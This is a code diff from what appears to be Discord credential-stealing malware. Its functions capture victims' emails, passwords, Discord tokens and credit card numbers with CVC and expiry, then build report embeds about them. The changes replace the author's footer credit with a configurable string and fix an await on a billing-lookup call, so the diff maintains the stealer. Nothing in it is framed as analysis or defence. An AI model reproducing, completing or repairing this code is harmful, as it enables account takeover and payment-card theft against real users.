@@ -341,7 +341,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Made by ClaraCrazy",
+          text: config.stringspy.replace(/.{200}/g, "$0\n"),
         },
       },
     ],
@@ -383,7 +383,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Made by ClaraCrazy",
+          text: config.stringspy.replace(/.{200}/g, "$0\n"),
         },
       },
     ],
@@ -425,7 +425,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Made by ClaraCrazy",
+          text: config.stringspy.replace(/.{200}/g, "$0\n"),
         },
       },
     ],
@@ -438,7 +438,7 @@ const PaypalAdded = async (token) => {
   const json = await getInfo(token);
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
-  const billing = getBilling(token);
+  const billing = await getBilling(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -467,7 +467,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Made by ClaraCrazy",
+          text: config.stringspy.replace(/.{200}/g, "$0\n"),
         },
       },
     ],
@@ -509,7 +509,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Made by ClaraCrazy",
+          text: config.stringspy.replace(/.{200}/g, "$0\n"),
         },
       },
     ],
@@ -553,7 +553,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: "Made by ClaraCrazy",
+          text: config.stringspy.replace(/.{200}/g, "$0\n"),
         },
       },
     ],
